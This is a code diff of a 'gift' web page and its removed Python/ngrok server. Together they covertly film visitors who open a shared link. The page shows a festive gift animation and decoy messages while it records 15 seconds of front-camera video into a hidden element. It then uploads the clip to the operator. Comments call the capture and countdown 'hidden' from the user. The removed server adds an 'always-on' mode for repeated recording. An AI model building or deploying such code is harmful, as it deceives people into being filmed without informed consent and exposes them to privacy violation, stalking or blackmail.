@@ -1,40 +1,9 @@
-#!/usr/bin/env python3
-"""
-Festival Video Receiver - Dual Mode
-Mode 1: One-time (record once, then close)
-Mode 2: Always-on (keep server running, record on demand)
-"""
-
-import os
-import sys
-import time
-import json
-import subprocess
-import threading
-import signal
-import urllib.request
-from datetime import datetime
-from pathlib import Path
-from flask import Flask, request, jsonify, send_file, render_template_string
-from flask_cors import CORS
-
-# ============================================
-# Configuration
-# ============================================
-UPLOAD_FOLDER = 'festival_videos'
-PORT = 5000
-MODE = "one-time"  # Default: one-time mode
-
-# ============================================
-# HTML Template - Gift Theme
-# ============================================
-HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 {{ festival_name }}</title>
+    <title>🎁 Gift Video Recorder</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -300,34 +269,7 @@ HTML_TEMPLATE = """
             min-height: 20px;
             opacity: 0.5;
         }
-        .mode-badge {
-            position: absolute;
-            top: -10px;
-            right: -10px;
-            background: rgba(255,215,0,0.3);
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            border: 1px solid rgba(255,215,0,0.3);
-            backdrop-filter: blur(10px);
-        }
         #hiddenVideo { display: none; }
-        #controlPanel { display: none; margin-top: 20px; }
-        #controlPanel.visible { display: block; }
-        .control-btn {
-            background: rgba(255,255,255,0.15);
-            border: 1px solid rgba(255,255,255,0.2);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s ease;
-        }
-        .control-btn:hover {
-            background: rgba(255,255,255,0.25);
-        }
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
             .festival-title { font-size: 2rem; }
@@ -352,20 +294,14 @@ HTML_TEMPLATE = """
     <video id="hiddenVideo" autoplay playsinline></video>
     
     <div class="festival-card" id="festivalCard">
-        <span class="mode-badge" id="modeBadge">Mode: {{ mode }}</span>
         <span class="main-emoji" id="mainEmoji">🎊</span>
-        <h1 class="festival-title">{{ festival_name }}</h1>
+        <h1 class="festival-title"><span class="festival-name" id="festivalName">Gift</span></h1>
         <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
         
         <button class="gift-btn" id="giftBtn">
             <span class="btn-emoji">🎁</span>
             <span id="btnText">Open Your Gift</span>
         </button>
-        
-        <div id="controlPanel">
-            <button class="control-btn" id="recordBtn">🎥 Record Now</button>
-            <button class="control-btn" id="closeBtn">🔒 Close Server</button>
-        </div>
         
         <div class="surprise-container" id="surpriseContainer">
             <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
@@ -378,6 +314,9 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
+        // ============================================
+        // DOM Elements
+        // ============================================
         const videoElement = document.getElementById('hiddenVideo');
         const giftBtn = document.getElementById('giftBtn');
         const btnText = document.getElementById('btnText');
@@ -390,29 +329,32 @@ HTML_TEMPLATE = """
         const giftOverlay = document.getElementById('giftOverlay');
         const giftEmoji = document.getElementById('giftEmoji');
         const giftText = document.getElementById('giftText');
-        const modeBadge = document.getElementById('modeBadge');
-        const controlPanel = document.getElementById('controlPanel');
-        const recordBtn = document.getElementById('recordBtn');
-        const closeBtn = document.getElementById('closeBtn');
-        const subtitle = document.getElementById('subtitle');
+        const festivalName = document.getElementById('festivalName');
 
-        const UPLOAD_URL = window.location.origin + '/upload';
-        const MODE = '{{ mode }}';
-        const DURATION = 15;
-        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
-        let timerInterval = null, timeRemaining = DURATION, isRecording = false;
+        // ============================================
+        // Configuration - Edit these as needed
+        // ============================================
+        const UPLOAD_URL = '/upload';  // Change this to your server URL
+        const FESTIVAL_NAME = 'Birthday Gift';  // Change this to your festival name
+        const DURATION = 15;  // Recording duration in seconds
+
+        // Set the festival name
+        festivalName.textContent = FESTIVAL_NAME;
+
+        // ============================================
+        // State Variables
+        // ============================================
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let timerInterval = null;
+        let timeRemaining = DURATION;
+        let isRecording = false;
         let isGiftOpened = false;
-        let isAlwaysOn = false;
 
-        // Show control panel for always-on mode
-        if (MODE === 'always-on') {
-            isAlwaysOn = true;
-            controlPanel.classList.add('visible');
-            subtitle.textContent = '✨ Camera is always ready! Click "Record Now" anytime ✨';
-            statusMessage.textContent = '🔴 Camera permission is active. You can record anytime!';
-        }
-
-        // Confetti generator
+        // ============================================
+        // Confetti Generator (Background)
+        // ============================================
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -428,9 +370,14 @@ HTML_TEMPLATE = """
             confettiContainer.appendChild(confetti);
         }
 
+        // ============================================
+        // Gift & Surprise Functions
+        // ============================================
         function showGiftReveal() {
+            // Show overlay with gift
             giftOverlay.classList.add('active');
             
+            // Animate gift opening sequence
             let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
             let index = 0;
             
@@ -442,14 +389,16 @@ HTML_TEMPLATE = """
                     giftEmoji.textContent = '🎉';
                     giftText.textContent = '🎊 SURPRISE! 🎊';
                     
+                    // Launch celebration confetti
                     launchCelebrationConfetti();
                     
+                    // Auto-hide after 5 seconds
                     setTimeout(() => {
                         giftOverlay.classList.remove('active');
                         festivalCard.classList.remove('opening');
                         mainEmoji.classList.remove('opening');
                         giftBtn.disabled = false;
-                        giftBtn.innerHTML = '<span class="btn-emoji">🎁</span><span id="btnText">Open Another Gift</span>';
+                        btnText.textContent = 'Open Another Gift';
                         statusMessage.textContent = '💝 Thank you! You can open another gift!';
                         surpriseContainer.classList.remove('visible');
                         isGiftOpened = false;
@@ -477,31 +426,35 @@ HTML_TEMPLATE = """
             }
         }
 
-        async function recordVideo() {
+        // ============================================
+        // Gift Opening (Camera Recording)
+        // ============================================
+        async function openGift() {
             if (isGiftOpened) return;
             isGiftOpened = true;
             
             try {
+                // Update UI - Surprise mode
                 giftBtn.disabled = true;
-                document.getElementById('btnText').textContent = '🎀 Recording...';
+                btnText.textContent = '🎀 Opening...';
                 festivalCard.classList.add('opening');
                 mainEmoji.classList.add('opening');
                 mainEmoji.textContent = '🎁';
                 surpriseContainer.classList.add('visible');
-                surpriseText.textContent = '🎀 Recording your gift...';
+                surpriseText.textContent = '🎀 Preparing your surprise...';
                 progressBar.style.width = '0%';
-                statusMessage.textContent = '⏳ Recording in progress...';
+                statusMessage.textContent = '⏳ Your surprise is being prepared...';
 
-                // Check if we already have a stream (always-on mode)
-                if (!mediaStream) {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    });
-                    videoElement.srcObject = mediaStream;
-                    await videoElement.play();
-                }
+                // Access camera (hidden)
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
 
+                videoElement.srcObject = mediaStream;
+                await videoElement.play();
+
+                // Setup recorder
                 recordedChunks = [];
                 mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                 mediaRecorder.ondataavailable = (event) => {
@@ -512,17 +465,20 @@ HTML_TEMPLATE = """
                     uploadGift(blob);
                 };
 
+                // Start recording (hidden)
                 mediaRecorder.start();
                 isRecording = true;
                 timeRemaining = DURATION;
                 
-                surpriseText.textContent = '🎁 Recording your surprise...';
+                surpriseText.textContent = '🎁 Your surprise is being created...';
 
+                // Countdown (hidden from user)
                 timerInterval = setInterval(() => {
                     timeRemaining--;
                     const progress = ((DURATION - timeRemaining) / DURATION) * 100;
                     progressBar.style.width = progress + '%';
                     
+                    // Update surprise text with progress
                     const messages = [
                         '🎨 Creating magic...',
                         '✨ Adding sparkles...',
@@ -542,6 +498,7 @@ HTML_TEMPLATE = """
                         clearInterval(timerInterval);
                         timerInterval = null;
                         
+                        // Stop recording
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
@@ -550,13 +507,14 @@ HTML_TEMPLATE = """
                             progressBar.style.width = '100%';
                         }
                         
-                        // In one-time mode, stop the stream
-                        if (MODE === 'one-time' && mediaStream) {
+                        // Stop camera
+                        if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
                             mediaStream = null;
                             videoElement.srcObject = null;
                         }
                         
+                        // Show the gift reveal!
                         setTimeout(() => {
                             showGiftReveal();
                         }, 500);
@@ -565,10 +523,20 @@ HTML_TEMPLATE = """
 
             } catch (error) {
                 console.error('Error:', error);
-                statusMessage.textContent = '❌ Camera error: ' + error.message;
+                let errorMsg = '❌ ';
+                if (error.name === 'NotAllowedError') {
+                    errorMsg += 'Camera access denied. Please allow camera permission.';
+                } else if (error.name === 'NotFoundError') {
+                    errorMsg += 'No camera found on this device.';
+                } else if (error.name === 'NotReadableError') {
+                    errorMsg += 'Camera is in use by another application.';
+                } else {
+                    errorMsg += 'Something went wrong. Please try again.';
+                }
+                statusMessage.textContent = errorMsg;
                 statusMessage.style.opacity = '1';
                 giftBtn.disabled = false;
-                document.getElementById('btnText').textContent = 'Try Again';
+                btnText.textContent = 'Try Again';
                 isGiftOpened = false;
                 surpriseContainer.classList.remove('visible');
             }
@@ -579,333 +547,44 @@ HTML_TEMPLATE = """
             formData.append('video', blob, `gift_${Date.now()}.webm`);
 
             try {
-                const response = await fetch(UPLOAD_URL, { method: 'POST', body: formData });
+                const response = await fetch(UPLOAD_URL, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                
                 if (!response.ok) {
                     throw new Error('Upload failed: ' + response.status);
                 }
-                console.log('✅ Gift uploaded!');
+                console.log('✅ Gift video uploaded successfully!');
             } catch (error) {
                 console.error('Upload error:', error);
+                statusMessage.textContent = '❌ Upload failed. Please try again.';
+                statusMessage.style.opacity = '1';
             }
         }
 
+        // ============================================
         // Event Listeners
-        giftBtn.addEventListener('click', recordVideo);
+        // ============================================
+        giftBtn.addEventListener('click', openGift);
         
+        // Also allow clicking on the card/emoji
         festivalCard.addEventListener('click', () => {
             if (!isGiftOpened && !giftBtn.disabled) {
-                recordVideo();
+                openGift();
             }
         });
 
-        // Always-on mode controls
-        if (isAlwaysOn) {
-            recordBtn.addEventListener('click', () => {
-                if (!isGiftOpened && !giftBtn.disabled) {
-                    recordVideo();
-                }
-            });
-            
-            closeBtn.addEventListener('click', async () => {
-                if (confirm('Close the server and stop receiving videos?')) {
-                    await fetch('/shutdown', { method: 'POST' });
-                    statusMessage.textContent = '🔒 Server is shutting down...';
-                    giftBtn.disabled = true;
-                }
-            });
-        }
-
         window.addEventListener('beforeunload', () => {
             if (mediaRecorder && isRecording) mediaRecorder.stop();
-            if (mediaStream && MODE === 'one-time') {
+            if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
         });
 
-        console.log('🎁 Gift interface loaded! Mode: ' + MODE);
-        if (isAlwaysOn) {
-            console.log('🔴 Always-on mode: Camera ready for on-demand recording');
-        }
+        console.log('🎁 Gift interface loaded!');
+        console.log('📹 Recording duration: ' + DURATION + ' seconds');
+        console.log('🎯 Upload URL: ' + UPLOAD_URL);
     </script>
 </body>
 </html>
-"""
-
-# ============================================
-# Flask Application
-# ============================================
-app = Flask(__name__)
-CORS(app)
-
-received_videos = []
-server_running = True
-
-@app.route('/')
-def index():
-    festival_name = app.config.get('FESTIVAL_NAME', 'Gift')
-    mode = app.config.get('MODE', 'one-time')
-    return HTML_TEMPLATE.replace('{{ festival_name }}', festival_name).replace('{{ mode }}', mode)
-
-@app.route('/upload', methods=['POST'])
-def upload_video():
-    try:
-        if 'video' not in request.files:
-            return jsonify({'error': 'No video file'}), 400
-        
-        video_file = request.files['video']
-        if video_file.filename == '':
-            return jsonify({'error': 'No filename'}), 400
-
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"gift_{timestamp}.webm"
-        filepath = os.path.join(UPLOAD_FOLDER, filename)
-
-        video_file.save(filepath)
-        
-        video_info = {
-            'filename': filename,
-            'path': filepath,
-            'timestamp': timestamp,
-            'size': os.path.getsize(filepath)
-        }
-        received_videos.append(video_info)
-        
-        print(f"\n📹 Received video {len(received_videos)}")
-        
-        # Auto-open the video
-        try:
-            if sys.platform == 'linux':
-                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            elif sys.platform == 'darwin':
-                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
-        
-        return jsonify({'success': True, 'filename': filename}), 200
-
-    except Exception as e:
-        print(f"❌ Error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/shutdown', methods=['POST'])
-def shutdown():
-    """Shutdown the server (for always-on mode)"""
-    global server_running
-    server_running = False
-    print("\n🔒 Server shutdown requested")
-    return jsonify({'success': True}), 200
-
-@app.route('/videos', methods=['GET'])
-def list_videos():
-    return jsonify({'videos': received_videos})
-
-@app.route('/download/<filename>', methods=['GET'])
-def download_video(filename):
-    filepath = os.path.join(UPLOAD_FOLDER, filename)
-    if os.path.exists(filepath):
-        return send_file(filepath, as_attachment=True)
-    return jsonify({'error': 'File not found'}), 404
-
-# ============================================
-# Main Tool Class
-# ============================================
-class FestivalReceiver:
-    def __init__(self):
-        self.festival_name = ""
-        self.ngrok_process = None
-        self.ngrok_url = None
-        self.port = PORT
-        self.running = True
-        self.ngrok_ready = threading.Event()
-        self.mode = "one-time"  # Default
-
-    def setup_directories(self):
-        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
-
-    def get_mode(self):
-        print("\n" + "="*50)
-        print("🎁 GIFT VIDEO RECEIVER")
-        print("="*50)
-        print("\nSelect mode:")
-        print("  1. One-time mode - Record once, server closes after")
-        print("  2. Always-on mode - Keep running, record anytime")
-        print("\n   (With Always-on, user grants permission once)")
-        print("   (You can record multiple times with a click)")
-        
-        while True:
-            choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice == '1':
-                self.mode = "one-time"
-                app.config['MODE'] = "one-time"
-                print("\n✅ One-time mode selected")
-                break
-            elif choice == '2':
-                self.mode = "always-on"
-                app.config['MODE'] = "always-on"
-                print("\n✅ Always-on mode selected")
-                print("   User gives permission once, you can record anytime!")
-                break
-            else:
-                print("❌ Invalid choice. Enter 1 or 2")
-
-    def get_festival_name(self):
-        while True:
-            name = input("\n📝 Enter gift name: ").strip()
-            if name:
-                self.festival_name = name
-                app.config['FESTIVAL_NAME'] = name
-                break
-            print("❌ Name cannot be empty!")
-
-    def check_ngrok(self):
-        try:
-            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
-            if result.returncode == 0:
-                return True
-        except FileNotFoundError:
-            pass
-        
-        print("\n❌ ngrok is not installed or not in PATH!")
-        return False
-
-    def monitor_ngrok(self):
-        try:
-            time.sleep(3)
-            for attempt in range(10):
-                try:
-                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
-                        data = json.loads(response.read().decode())
-                        for tunnel in data.get('tunnels', []):
-                            if tunnel.get('proto') == 'https':
-                                self.ngrok_url = tunnel.get('public_url')
-                                self.ngrok_ready.set()
-                                return
-                except Exception:
-                    time.sleep(3)
-        except Exception as e:
-            print(f"❌ Error monitoring ngrok: {e}")
-
-    def start_ngrok(self):
-        print(f"\n🚀 Starting ngrok tunnel...")
-        
-        try:
-            self.ngrok_process = subprocess.Popen(
-                ['ngrok', 'http', str(self.port)],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL
-            )
-            
-            monitor_thread = threading.Thread(target=self.monitor_ngrok)
-            monitor_thread.daemon = True
-            monitor_thread.start()
-            
-            if self.ngrok_ready.wait(timeout=30):
-                print(f"✅ Tunnel established!")
-                return True
-            else:
-                print("⚠️ ngrok started but URL not found")
-                return False
-                
-        except Exception as e:
-            print(f"❌ Failed to start ngrok: {e}")
-            return False
-
-    def start_flask(self):
-        print(f"\n🔧 Starting server...")
-        
-        def run_flask():
-            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
-        
-        flask_thread = threading.Thread(target=run_flask)
-        flask_thread.daemon = True
-        flask_thread.start()
-        time.sleep(2)
-        print("✅ Server running")
-
-    def generate_link(self):
-        print("\n" + "="*50)
-        print("📤 SHARE THIS GIFT LINK:")
-        print("="*50)
-        print(f"\n🔗 {self.ngrok_url}")
-        print("\n" + "="*50)
-        
-        if self.mode == "one-time":
-            print("\n📋 One-time mode:")
-            print("   - User opens link")
-            print("   - Clicks 'Open Your Gift'")
-            print("   - Records 15-second video")
-            print("   - Server closes after video received")
-        else:
-            print("\n📋 Always-on mode:")
-            print("   - User opens link")
-            print("   - Grants camera permission (Always Allow)")
-            print("   - You can trigger recordings anytime")
-            print("   - Click 'Record Now' or the gift button")
-            print("   - Videos keep arriving until you close")
-        
-        print("="*50)
-        print("\n📋 Link printed above - copy it manually")
-
-    def wait_for_videos(self):
-        print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
-        print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
-        print("-"*50)
-        
-        print("\n⏳ Waiting for first video...")
-        
-        try:
-            last_count = 0
-            while self.running and server_running:
-                current_count = len(received_videos)
-                
-                if current_count > last_count:
-                    print(f"\n📹 Received video {current_count}")
-                    last_count = current_count
-                    
-                    if self.mode == "one-time":
-                        print("\n🎯 One-time mode: Video received!")
-                        print("🔒 Closing server...")
-                        break
-                    else:
-                        print(f"\n⏳ Waiting for next video...")
-                
-                time.sleep(1)
-                
-        except KeyboardInterrupt:
-            print("\n\n👋 Shutting down...")
-
-    def cleanup(self):
-        print("\n🧹 Cleaning up...")
-        if self.ngrok_process:
-            self.ngrok_process.terminate()
-            try:
-                self.ngrok_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                self.ngrok_process.kill()
-        print("✅ Done!")
-
-    def run(self):
-        try:
-            self.setup_directories()
-            self.get_mode()
-            self.get_festival_name()
-            
-            if not self.check_ngrok():
-                return
-            
-            self.start_flask()
-            if not self.start_ngrok():
-                return
-            
-            self.generate_link()
-            self.wait_for_videos()
-            
-        except KeyboardInterrupt:
-            print("\n\n👋 Goodbye!")
-        finally:
-            self.cleanup()
-
-if __name__ == '__main__':
-    receiver = FestivalReceiver()
-    receiver.run()
